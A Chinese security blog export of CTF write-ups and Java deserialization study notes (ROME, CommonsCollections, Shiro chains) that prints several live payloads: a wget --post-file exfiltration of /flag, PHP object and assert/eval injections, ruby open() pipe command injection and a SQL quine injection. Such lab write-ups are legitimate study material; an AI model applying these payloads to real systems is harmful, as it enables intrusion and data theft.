[{"title":"java反序列化 rome链以及陇原战疫的java题","date":"2021-11-09T12:14:04.000Z","url":"/2021/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rome%E9%93%BE%E4%BB%A5%E5%8F%8A%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB%E7%9A%84java%E9%A2%98/","categories":[["java","/categories/java/"]],"content":"java反序列化 rome链以及陇原战疫的java题陇原战役遇到一道java题，里面有rome依赖，比赛的时候一搜发现是有现成的链子。 参考  RomeROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。 ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。 关键类ObjectBean和ToStringBean类和EqualsBean类 起点是hashmap的readObject，终点是在ToStringBean的toString方法 但最后的利用点事这样的 不可控.invoke(可控,NO_PARAMS)` 需要加载字节码来rce，这个之后说 链子调用链 起点就是经典的hashmap调用任意类的hashcode方法。 看看ObjectBean类的hashcode() 可以调用equalsBean的beanHashCode()方法，跟进看看 这里又可以调用ObjectBean的toString() 继续跟 就来到终点了，ToStringBean的toString 但该类有两个toString ，一个无参一个有参，这里调用的无参。 之后无参调用有参 至于这个prefix的赋值及ToStringBean的_obj属性，看一下两个类的构造函数就知道 到最后rce的地方了 因为这个invoke的第二个参数是空的，所以需要tmpl加载字节码来rce。 这里有一个判断 满足这个if才能进入invoke，前面的调用有点复杂，用参考文章的话来说就是 有参toString方法会调用 BeanIntrospector.getPropertyDescriptors() 来获取 _beanClass 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 _obj 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。 回顾tmpl调用字节码的过程 起点是getOutputProperties() 是个无参方法，所以链子通了。 写个exp 陇原战疫原题 有个rome依赖 有个黑名单 不能用HashMap和BadAttributeValueExpException，rome链本就用不到BadAttributeValueExpException，HashMap只是为了其readObject里调用hashcode，换成Hashtable即可。 当时题目不出网，因为spring框架，用spring通用回显。 exp： 但这题其实实际上后面有调用toString 所以exp应该还能简化，比赛时直接用了整条链子，能打通，不管了"},{"title":"陇原战疫web部分wp","date":"2021-11-08T02:14:04.000Z","url":"/2021/11/08/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%ABweb-wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"webCheckIN下载源码，看到这里 这里调用wget，并且参数可控，可以直接外带数据，查看绑定路由 尝试访问/wget?argv=1 这里应该是出题人失误，无需登录可直接访问，利用–post-file参数直接外带文件 payload /wget?argv=fmyyy&amp;argv=--post-file&amp;argv=/flag&amp;argv= 服务器开个监听直接打就行 eaaasyphp反序列化，有个file_put_content可以写文件，本地能打通但是题目写不进去，估计没有写的权限，看phpinfo的hint payload ?code=O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3Bs%3A7%3A%22phpinfo%22%3B%7D 看到有fpm服务，file_put_contents可控，尝试ftp被动模式打fpm 网上找个ftp恶意服务器 生成payload的脚本 生成的payload(弹shell没成功，尝试curl外带数据) 放到恶意ftp服务器即可 vps运行ftp服务器 poc生成： poc EasyJaba反编译一下 不能用HashMap和BadAttributeValueExpException这两个，有remo的依赖 map换成Hashtable就行了 evil.class用spring通用回显的就行了，用下面这个文章里的就行了  "},{"title":"2021东华杯一道java题","date":"2021-11-05T11:52:04.000Z","url":"/2021/11/05/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF%E4%B8%80%E9%81%93java%E9%A2%98/","categories":[["java","/categories/java/"]],"content":"这次东华杯有个个java题，考点还挺有意思的。 看index控制器 有个很明显的readObject() pom.xml是空的，所以要试原生类或者题目给的类。 题目里给了个ToStringBean类。 在toString方法里有个defineClass用于加载动态字节码。 所以要找一个原生类在其readObject方法调用了toString方法。 CC5的链子里就有这样的类。 CC5的重点就是BadAttributeValueExpException这个类，看看他的readObject方法做了什么。 只放一点重要的源码 在下面看的到调用了valObj属性的toString方法。并且valObj是上面get方法获得的，说明其可控。 写exp 字节码的恶意类 服务器开个监听直接打 "},{"title":"长城杯线下赛赛后复现","date":"2021-10-13T04:10:04.000Z","url":"/2021/10/13/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"长城杯线下赛赛后复现前言去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。 fancyapi目录结构 逻辑很简单，web用的是python的flask框架，然后go写了几个接口处理数据。 看看backend.go 关键就在这里，action要==readFlag，secret==token，这个token的值是在数据库里的，再看 这里是可以造成sql注入的，注出token即可，但有个过滤，比赛时没有绕过去。。。然后基本上都在想办绕过这个过滤了。。 在app.py处 /search路由的提交的数据传入go接口进行数据库查询，也就是上面sql注入的地方，提交方式为json。 vote参数为整数型，关键在name参数处有个isalnum。 绕过方法为多参数，但我比赛的时候尝试了多参数但是没有绕过去。后来拿到了wp，在本地简单复现一下。 搭建一个简单的app.py 因为isalnum的过滤只能提交字母和数字，如图 上面说了多参数，我只想到覆盖，看了wp用的是[]绕过 附上一张比赛时的原图（不是我做的） 这之后还有个过滤 要传入action=”readFlag”但这里对readFlag有过滤 readFlag没法绕，这里是对路由进行绕过，这里判断当请求路径为/flag时才进行下面的判断，所以 %66lag?action=readFlag即可 比赛时觉得无解，现在看来学到了很多，还是太菜了 work一道java题，比赛的时候知道了大致的思路，但没有做出来，赛后复现一下。 主办方后来给了jar包。所以本地复现比较容易。 直接看后台操作 主要是这里。 这里jdbc参数全可控，搭建恶意mysql服务器读文件即可 但在做这个操作前需要登陆admin 看注册这里 如果按照常规的json格式提交，不管什么username都会被替换成hacker 例如 &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 注册成功，看看表里注册进了什么数据。 所以要绕过正则，这个正则很简单，用大小写或者畸形json数据即可，这里去掉双引号变成 &#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 可以看到注册成功了。登陆 /login?data=&#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 登陆成功后来到admin。 先起恶意mysql服务器。 脚本地址  启动脚本访问  读到/etc/passwd 之后读flag就行。 这题应该还可以用jdbc反序列化，之后学了再来试试。"},{"title":"java反序列化-改造CC3攻击shiro","date":"2021-10-03T13:14:04.000Z","url":"/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%94%B9%E9%80%A0CC3%E6%94%BB%E5%87%BBshiro/","categories":[["java","/categories/java/"]],"content":"java反序列化-改造CC3攻击shiro前言上一篇学了改造CC6，之前学过，CC3链子就是利用TemplatesImpl加载字节码进行反序列化，既然CC6可以改造，那么CC3也可以改造 改造CC3看看原来的CC3 我们要改的仍然是这部分 之前说过，不能有transformers数组，利用LazyMap#get传参的特性构造payload 要改的基本上就只有数组那部分 其余不变。 之后继续学习看看还有没有能够在shiro中使用的链子。"},{"title":"绿城杯-Light1ng WP","date":"2021-10-03T10:34:04.000Z","url":"/2021/10/03/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF%E2%80%94%E2%80%94Light1ng/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"Light1ng战队一、战队信息 名称：Light1ng 排名：16 二、解题情况进不去平台了，没法截图了 三、解题过程Web1.ezphpezphp在关于里看到个Git，所以考虑存在git泄露 index.php里的php代码 由于assert会进行命令执行，且$link_page参数可控，所以此处存在rce 构造闭合： ?link_page=flag.php&#39;, &#39;..&#39;) === true|eval($_POST[&#39;yy&#39;]);// POST传参： 执行成功，蚁剑连接： 在pages目录下拿到flag DASCTF{af5ff99c7f98d528e711acc42fd6b906} 2.Looking for treasure 打开源码 有提示。 下载到源码 审计。 有一处 这里读取了p文件，如果能控制p的值就能实现文件读取。 这个content和req.body肯定是不相同的不用管它 ，所以p的内容最后会在报错信息的content里发出 看看p是怎么来的 config.path给p赋值。所以得想办法控制path的值。 源码里看到 看到这个想到json-schema原型链污染 payload 成功读到了/etc/passwd的内容，猜测flag在根目录，直接读/flag 数据包 DASCTF&#123;5117143e660f592adc982dd96d2c3f17&#125; PWN1.null正常的菜单堆题，off-by-one漏洞，我没可以看见edit和add中都有read_input（）函数，而漏洞点就在这个read_input（）函数中 可以看见a2+1多读了一个字节我们可以利用这个漏洞来改写chunk的大小造成堆块的重叠。 Exp： 2.uaf正常的菜单题 漏洞点在，free后指针没有置0，造成uaf漏洞，直接freechunk泄露libc，打malloc_hook Exp： 3.Greentownnote这个题的漏洞在于dele这个操作，并没将ptr+8置0 在这可以看到有沙箱函数禁用了exevce，只能读取flag 整体逻辑如下，有正常的add，dele，show功能 直接doublefree泄露libc，利用libc中的函数context可以对其进行栈迁移，我们在堆上提前布置好rop，在利用free_hook函数触发，context+53，将栈迁移到我们布置好的rop处，然后利用srop将rip指向syscall，读取flag 完整exp： RE1.easy_re程序不难，丢入OD，进行分析 发现仅仅是单纯的xor加密,这就好办了,只需要把加密数据dump出来，然后在dump回输入内存，即可让他自动解密（取了个巧，算法没看，猜测可能是RC4魔改） 加密数据如上图 Dump过去，程序自动解密即可 2.[warmup]babyvxworksIDA上来就开幕雷击 很明显，这是一个花指令,直接nop掉 手动处理完，类似上图的所有花指令后，直接IDA F5 Helloworld干了个啥，我也不晓得，但是,算法很明显，就是递归异或0x22，并加3，直接写脚本跑 flag: 3.抛石机先搞清程序如何执行成功 很明显，就是要让x&lt;=y-0.001 z&lt;=d-0.001且要满足那4个一元二次方程，因为不论是v1,v2,v3,v4的取值范围都很小，无限接近于0，不妨设v1=v2=v3=v4=0，然后解这4个一元二次方程(还是在线解吧:)，解得4个值:x1 = 1.08 , x2 = 4.33,x3 = -0.48 , x4 = 1.98，这是4个双浮点数，将他们转为字节 其余3个也是如上图这样转换，然后根据x&lt;=y-0.001 z&lt;=d-0.001，可知x=1.08,y=4.33,d=1.98,z=-0.48 回到开始，这里其实是一个格式的固定，判断是否为flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}格式的flag，并不是照抄,x仅仅代表的是任意字符 全局变量初始化 运算结果，然后进行比较 这里通过动调不难发现规律，输入:13,返回结果就是13，输入ab，返回结果就是AB。 当然这里有个细节得注意，这里仅仅只操作了4个字节，而我们运算的双浮点数是8个字节，很明显不满足我们的条件，所以是算法的问题吗？No，其实后面4个字节，对整体双浮点数的影响微乎其微，所以我们可以舍弃掉，毕竟，他毕竟的是一个范围，而不是一个确切的数字，所以经过计算(我是手工，别骂，flag好像有多组，不知道是不是题的bug):flag{48e17a14-52b8-1e85-b81e-85ebae47e17a} Crypto1.RSA-1易知n,c都是p的倍数,求两者公倍数即可得到p,后面简单求RSA即可 from gmpy2 import * from Crypto.Util.number import * n = 173652311549263483644782768725584927759117606030023943537236034618984057402347150 018201115486009149076170038066524923916867102562741566778871019971756922777296484 560875349876167437246465982344660947795407294135838263551452779804790401570754536 942505723166383481215712187597695337387215068111758669908519728384663075942262938 369341166596852157756432854658953177558927544733320342344957959361836105695710164 005353627626995176867816023020450485321314260352608789798921694410594676235230605 692855705771992363098881558330137219979339604577846532620761355617698387041668103 84309655788983073376941843467117256002645962737847 c = 694496710881543773542894128678411940313831971345573215592505592864653696259767294 180583131213068933801491345208129640027286271044720726509975040165782816583601312 284865683910085471996518868009737549119324912772559966038374682703180306602649798 929885642021625020603506818096379745479215119107143364594624591491673263700711708 519944289449566745554451748340400653660712148067868800042042228138053936851980716 217509976389198864811793777795106989997526019001899583490454144756271830743390659 202122666688563887702030400561445076308133708283860841475616225382569742049350991 4578546951634127502393647068722995363753321912676 p=gcd(n,c) q=n//p phi=(p-1)*(q-1) `e=65537 d=invert(e,phi) M=powmod(c,d,n) m=M//2021//1001//p print(long_to_bytes(m)) flag: 2.Warmup仿射加密,简单逆一下就行 flag: 3.RSA_plus第一部分n1是四个素数的乘积，其中$p和p_1,q和q_1$相近，将n1放入在线网站factordb中分解得到N1和N2，通过开根爆破的方式运行很久都没有出答案，于是可以猜测N1和N2不是由$pp1和qq1$得到，而是$pq1和p1q$得到，假设$p_1=p+p_0;q_1=q+q_0$，通过$(N_1-N_2+p_0q_0)^2+4p_0q_0N_2=(pq_0-p_0q+p_0q_0)^2+4p_0q_0N_2=(pq_0+p_0q+p_0q_0)^2$知，我们可以爆破$p_0,q_0$计算$(N_1-N_2+p_0q_0)^2+4p_0q_0N_2$是否为完全平方数来判断$p_0，q_0$是否为我们所求，这可以用$gmpy2$库里的iroot函数实现。找到$p_0,q_0$后求出p,q,p1,q1，然后通过欧拉函数的积性知$\\varphi(n1)=(p-1)(q-1)(p1-1)(q1-1)$，解出第一部分的flag1。 第二部分已知p2,q2之和,p2,q2之积，可通过求$x^2-(p_2+q_2)x+p_2q_2=0$的两个根得到p2,q2，再通过欧拉函数对素数幂的表达式$\\varphi(n2)=(p_2^2-p_2)(q_2^3-q_2^2)$求得，然后正常的RSA解密得flag2，最后将flag1和flag2合并即可 flag: Misc[warmup]音频隐写下载附件，丢入010分析，发现是WAV的文件头，于是把附件的后缀改为.wav 修改完之后，得到一段音频文件，既然题目提示了音频隐写，那就用Audacity打开这段音频分析一下 音频没发现有什么隐藏信息，于是 打开频谱图看看 得到flag: 创新技术无"},{"title":"java反序列化-TemplatesImpl在Shiro中的利用","date":"2021-10-03T10:14:04.000Z","url":"/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/","categories":[["java","/categories/java/"]],"content":"前言有段时间没学java了，最近被一堆事情和比赛拖着，国庆假期正好继续补一下java java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将TemplatesImpl 融合到Commons-Collections利用链中，执行任意Java字节码。 这次要解决一个问题：为什么已经有CC6这种高版本通杀链了还需要TemplatesImpl的链子呢？ 可以用shiro反序列化来测试TemplatesImpl反序列化。 shiro反序列化的原理测试之前先添加一波依赖 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。 使用CommonsCollections6攻击Shiro p神自己做了个小demo方便我这种菜鸡学习 demo下载地址  maven打成war包后放入tomcat的webapp目录即可。初始密码root/secret 登录时勾选remember me。 勾选之后登陆cookie会生成rememberMe字段，之前说了这个字段被发送到服务端进行反序列化，所以我们的攻击流程 使用以前学过的CommonsCollections利用链生成一个序列化Payload 将payload用shiro默认key加密 将加密后的payload放入rememberMe字段发送给服务端触发反序列化 可以用下面代码生成cc6的payload 将生成的payload直接打入会报错 p神自己经过调试给出结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。 我们的payload里就有数组 解决办法我们不能用到数组，回忆一下，触发反序列化的最关键的点在与LazyMap的get方法 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。 但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。还记得ConstantTransformer类的作用吗，在学cc1的时候提到过。 这起到一个简单的参数传递作用，那我们能不能找到代替这个作用且不需要数组的利用点呢。 再来看看LazyMap的get方法 我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，但此时发现，这个 LazyMap#get 的参数key，会被传进transform()，实际上它可以扮演 ConstantTransformer的角色，所以我们最后的难题也解决了 改造CC6为CCShiro 通过Client.java生成payload（别忘了写个Evil类用来获取字节码） 这里用到了javassist，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl 。 "},{"title":"蓝帽杯_one_Pointer_php复现","date":"2021-09-28T01:14:04.000Z","url":"/2021/09/28/%E8%93%9D%E5%B8%BD%E6%9D%AF_one_Pointer_php%E5%A4%8D%E7%8E%B0/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"下载源码 这里溢出即可，因为$count[]=1相当于在数组末位添加一个键值+1，值为1的数据，当前面的键值为long类型最大值时，+1后溢出造成报错绕过。 poc 之后是命令执行，看被ban的函数。 看phpinfo看到了fastcgi 绕过open_basedir读配置文件 读到了这个 fastcgi开在9001端口 写个shell，蚁剑连接。 这里蚁剑的绕过 disable_functions 插件是绕不过去的。 因为ban了fsockopen函数，插件源码是利用这个函数跟fpm通信的。 但可以改插件源码，把 fsockopen换成pfsockopen，两者没区别。还要改端口为9001. 显示root，虚拟终端执行webshell显示为www-data，直接读文件即可。 "},{"title":"2021第五空间webakwp","date":"2021-09-21T14:10:04.000Z","url":"/2021/09/21/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4webakwp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"前言挺傻逼的，5道web题全是静态靶机，三道rce题，不知道主办方咋想的。附一张图不过也算是ak了web 总体感觉还不错 webftp这题就要说到搅屎的问题了，我直接扫路径扫到1.txt看到flag，大概是哪位大师傅放的赛后跟别的师傅聊了一下，预期解是github上能下载源码然后看就行。 EasyCleanup源码逻辑很简单，给了phpinfo和任意文件包含这里的 session.upload_progress.cleanup 是off的，不会自动清除session文件那直接传PHPSESSID然后包含就行,都不需要条件竞争。exp 然后包含/tmp/sess_aa传命令即可 pklovecloud简单的反序列化poc 之后源码找flag PNG图片转换器这里利用了ruby的open函数能造成命令执行的特性open函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。 管道字符“|”开头，执行管道字符后面的命令 原题传文件，获得唯一文件名，然后读取文件的base64编码。在读取这里 file可控，但得满足上面的条件，这个限制也不是很严格上传两张图片记住文件名在/convernt处第一步file=|echo &quot;Y2F0IC8q&quot;|base64 -d &gt; 0784368baeb4d0a58b04309f20df6f2e.pngY2F0IC8q是cat /*的base64第二步file=|sh 0784368baeb4d0a58b04309f20df6f2e.png&gt;405391431ca1ac9b33f35add1f4ef55c.png之后读405391431ca1ac9b33f35add1f4ef55c.png拿到flag base64解码即可 补充赛后跟feng师傅聊了一下 发现不用这么麻烦，在上传处即可命令执行可以看到，加密的参数是file[filename]但open的参数file[tempfile]是可控的 所以直接再读这个文件即可 yet_another_mysql_injection能时间盲注，但数据库里啥也没有再看逻辑， 就是查询语句要和查询结果一样就可以了这篇文章很详细原文的payload改一下能用原文的SELECT REPLACE(REPLACE(&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#39;) AS Quine本题有过滤，且是注入，所以得改一下 更改后的：username=admin&amp;password=&#39;UNION/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHAR(34),CHAR(39)),CHAR(63),&quot;?&quot;)/**/AS/**/a#&#39;,CHAR(34),CHAR(39)),CHAR(63),&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHAR(34),CHAR(39)),CHAR(63),&quot;?&quot;)/**/AS/**/a#&#39;)/**/AS/**/a#直接打就行 总结企业组第十三，，akweb的队伍很多，主要还是靠队友的misc re和密码才拿到这个名次，又被队友带飞了"},{"title":"2021祥云杯web部分wp","date":"2021-09-21T13:14:04.000Z","url":"/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"前言体验还行 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 底下有个字符串拼接，可以触发__toString,全局搜索__toString AppendStream下有__toString 并且调用了rewind(),找找看这个rewindCachingStream类这里有，并且还调用了seek方法，seek又调用了read方法,在这个read方法里又调用了一个read方法 我们可以控制$this-&gt;stream为我们想要的类，查找read，最后在PumpStream类里 这个类有read方法 ，read调用了pump pump方法调用了call_user_func，所以可以RCE 就写到这吧 我把链子找完的时候队友已经出了，还告诉我网上有公开的poc，心累，说好的最新呢 安全检测检测127.0.0.1成功了 是ssrf，利用ssrf扫路径扫到了源码 包含一下session文件呗payload: 你的PHPSESSID&amp;payload=成功了 挺奇怪的 源码里ban了反引号我这里却可以用 不管了 flag出了就行。 层层穿透这题做了好久，只会一点java的我靠着github上的一键shell poc做完了第一层反弹shell，github有直接可以利用的工具 弹个shell到自己的公网上。题目提示内网信息搜集到了10.10.1.11:8080,估计是内网web环境，先把附件源码反编译一下，因为题目环境20分钟刷新一次，所以现在本地打对着源码逻辑先登录，账号密码源码里可以直接找到 看到admin/test路由存在fastjson反序列化点。不怎么会java反序列化，但是github上有不出网直接在数据包里回显的一键shellpoc照着github上的readme直接打，发现提示太短，看源码把poc复制两边再打就打通了本地打通了，之后是题目。我花了大部分时间在搞代理 有几个小时吧 最后选择了frp 确实方便frp教程端口转发成功后按照刚刚本地的步骤直接打就行（一定找个时间好好学java） Crawer_z引用了zombie框架，谷歌查找 全网只找到这个框架一篇漏洞漏洞描述攻击者可以在他们的页面中插入JS代码来利用zombiejs代码注入漏洞。如果使用zombiejs 抓取此类页面，则运行爬虫的机器将运行攻击者提供的任意命令。为了比较，jsdom 默认禁用脚本执行。 想办法让题目访问我们准备的恶意页面就行。payload在这个博客里都准备好了，提取一下 改成弹shell的 有了payload，我们要想办法让题目访问我们的恶意页面。看一下源码。在user.js下看到访问/user/bucket似乎会自动访问我们个人信息里设置的bucket，尝试访问。尝试更改bucket设置，先看源码在checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com我们尝试修改前面为自己的公网ip地址点击更新 变回原来的了，并且提示admin会来检查，但在源码里看到这里其实算是更改失败了，admin不会去检查源码里有个重定向到/user/verify?token=${authToken}，我们尝试用队伍token浏览器url输入队伍token修改bucket，但不要点击update，直接在访问我们放入队伍token后的url提示更改成功 看到我们的bucket也被设置成了我们的服务器地址其实这里我还没怎么懂原理，只是试了一下发现可以，那就歪打正着直接用。再访问/user/bucket回显的内容变了，报错404，这是因为我的公网上没有oss-cn-beijing.ichunqiu.com这个文件。到这里思路就很清晰了，我们在公网上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件，然后修改bucket为http://公网ip地址/oss-cn-beijing.ichunqiu.com.html并且这个html文件已经被我们插入了用&lt;script&gt;标签包裹的恶意payload服务器起个监听题目内访问/user/bucket弹成功了。 这次比赛就做了这四道题，做完java那题距比赛结束就1小时了，被队友带飞进了前三十 队友们tql"},{"title":"一条laravel5.1的链子","date":"2021-09-10T13:14:04.000Z","url":"/2021/09/10/%E4%B8%80%E6%9D%A1laravel5.1%E7%9A%84%E9%93%BE%E5%AD%90/","categories":[["框架","/categories/%E6%A1%86%E6%9E%B6/"]],"content":" ## 前言挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 poc分析。我找的destruct方法是Swift_Transport_AbstractSmtpTransport类的看一下他做了什么。 调用了该类的stop方法 看一下stop 箭头这里可以触发__call方法，之后找__call就可以了。但这个类是一个抽象类，所以用他的子类Swift_Transport_EsmtpTransport。 之后是找__call方法。我找到的是DatabaseManager类，看一下他的__call方法。 调用了该类的connection方法，看一下这个方法。 重点在于$this-&gt;makeConnection方法 可以看到最下面可以调用任意类的make方法。但其实这里本身就有call_user_func方法，但这里的没办法利用，这个等一下说原因。全局找make方法。最后在FactoryBuilder里 该类的make调用了makeInstance再看看makeInstance 可以看到call_user_func了，并且参数全可控。所以我们的链子就通了 一些细节解答一下之前makeConnection方法里的call_user_func为啥不能用。我们看一下他的参数。 第一个参数extensions[$name]是可控的，没有问题，关键是第二个config参数，看一下这个参数是怎么来的。 是该类的getConfig方法来的，看一下这个方法。 return的值是Arr::get方法的返回值，看一下这个方法 可以看到，不管怎么样，返回的都是一个数组。所以这个call_user_func不是很好利用。但应该也有利用的方法，我比较懒就找下面的了。而且正好我们FactoryBuilder里的make方法需要数组作为参数不然就会报错，所以这个config就很好的符合我们的要求但最后的makeInstance方法，因为第三个参数是数组，在执行时会报错。所以时没有回显的，但可以反弹shell或者写文件。我poc里构造的相当于 总结不算很好的链子，利用复杂，构造的参数也很严苛。"},{"title":"java反序列化CC3","date":"2021-09-08T13:14:04.000Z","url":"/2021/09/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CC3/","categories":[["java","/categories/java/"]],"content":"学习动态加载字节码的时候学到了TemplatesImpl加载字节码的方法。我们也可以利用这个特性进行命令执行。结合之前CC1的手动加载我们可以写一个简单的demo，这里用p神的 这里同样是手动触发的put，我们尝试利用cc1的TransformedMap链子触发。这里我自己写了个poc 当然LazyMap也是可以通的。 但CC3链子的出现自然有他的道理。CC3产生的目的就是为了绕过⼀些过滤器对InvokerTransformer的限制。越来越多的过滤器将InvokerTransformer类加入了黑名单，CC3链就是为了突破这个限制产生的。在ysoserial的CC3链子中能看到一些新东西。可以看到将InvokerTransformer换成了InstantiateTransformer类。并且引入了一个新的类com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter在这个类的构造函数里面 该构造函数的参数为Templates接口，而且我们之前利用的加载字节码的TemplatesImpl类实现了该接口。构造函数在给__transformer参数赋值的时候进行了类型转换并且调用了newTransformer()方法。这个newTransformer()就是我们利用TemplatesImpl加载字节码的起点。但是没有InvokerTransformer如何调用这个构造方法？这里用到了InstantiateTransformer类 InstantiateTransformerInstantiateTransformer类也是一个实现了Transformer接口的类，看看他的transformer方法做了什么。 这里利用反射的机制调用了构造函数。iArgs参数就是我们的TemplatesImpl类。前面说到我们需要调用TrAXFilter的构造函数才能加载字节码，所以我们能利用这个类来调用TrAXFilter的构造方法就可以加载字节码，到此CC3就通了。poc "},{"title":"java反序列化CC6","date":"2021-09-04T13:14:04.000Z","url":"/2021/09/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CC6/","categories":[["java","/categories/java/"]],"content":"因为sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化，导致cc1的链子在8u71版本后无法使用。所以要找一条能在java更高版本使用的链子。 cc6的简化版利用链 p神给的poc CC1是触发LazyMap.get方法进行命令执行，CC6是找到其他调用这个方法的地方。这个类是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法： 所以又要去找哪里触发了TiedMapEntry.hashCode()。在java.util.HashMap#readObject调用了hashCode该方法最后调用了hash，跟进hash方法看到hash方法调用了hashCode poc里用了个fakeTransformers p神在java安全漫谈反序列化5里讲到了他的作用，主要是为了防止本地调试的时候触发命令执行。 关于poc中的outerMap.remove(“keykey”);去掉outerMap.remove(“keykey”);则无法命令执行，主要原因在expMap.put(tme, “valuevalue”);中expMap是HashMap的实例HashMap.put中也调用了hash，但我们传入的是fakeTransformers，所以对poc产生了一定的影响。 在反序列化的过程中，触发反序列化最重要的LazyMap.get方法中并没有进入if分支里面，所以没有触发transfrom。所以为了让containsKey(key)判断为flase，用outerMap.remove(“keykey”);移除即可。触发transfrom之后的过程就跟cc1时一样的。"},{"title":"java动态加载字节码的方法","date":"2021-09-04T13:14:04.000Z","url":"/2021/09/04/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","categories":[["java","/categories/java/"]],"content":"讨论方法前先来看看什么是字节码 什么是java字节码严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。但是我们讨论的字节码可以扩大范围——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。Java的ClassLoader来用来加载字节码文件最基础的方法 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。 方法一、利用URLClassLoader加载远程class文件URLClassLoader是AppClassLoader的父类，该类可以加载远程class文件。正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们这里要利用第三种，协议得是非file，最常见的就是http先创建一个恶意类 在class文件所在的文件夹下用python快速起一个http服务器之后试试能不能用UrlClassLoader加载这个类 成功弹出计算器所以在实战中，我们如果能控制ClassLoader为一个http服务器就能加载恶意类。 方法二、利用ClassLoader#defineClass直接加载字节码不管是加载远程的class文件还是本地的class文件都是经历下面三个方法调用javaClassLoader#loadClass-&gt;ClassLoader#findClass-&gt;ClassLoader#defineClass loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 